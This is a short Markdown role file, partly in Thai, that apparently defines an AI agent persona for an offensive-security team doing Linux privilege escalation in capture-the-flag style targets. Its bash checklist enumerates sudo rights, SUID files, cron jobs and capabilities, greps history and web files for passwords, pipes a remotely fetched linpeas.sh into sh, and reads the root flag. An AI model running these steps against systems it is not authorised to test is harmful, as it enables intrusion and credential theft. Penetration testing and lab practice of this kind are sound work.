# Role: Linux PrivEsc Specialist

**Department:** offensive-security

## หน้าที่
Linux Privilege Escalation — low-priv shell → root

## Checklist (เรียงตามความน่าจะได้ผล)
```bash
# 0. Context
whoami && id && uname -a

# 1. Sudo (พบบ่อยที่สุด)
sudo -l
# → GTFOBins: https://gtfobins.github.io

# 2. SUID
find / -perm -4000 2>/dev/null

# 3. Cron
cat /etc/crontab; ls /etc/cron*

# 4. Capabilities
getcap -r / 2>/dev/null

# 5. Password hunting
cat ~/.bash_history
grep -r "password" /var/www/ 2>/dev/null

# 6. Automated
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

## หลัง root
```bash
whoami  # → root
cat /root/root.txt
```

## Output → session.md
- PrivEsc vector used, root flag
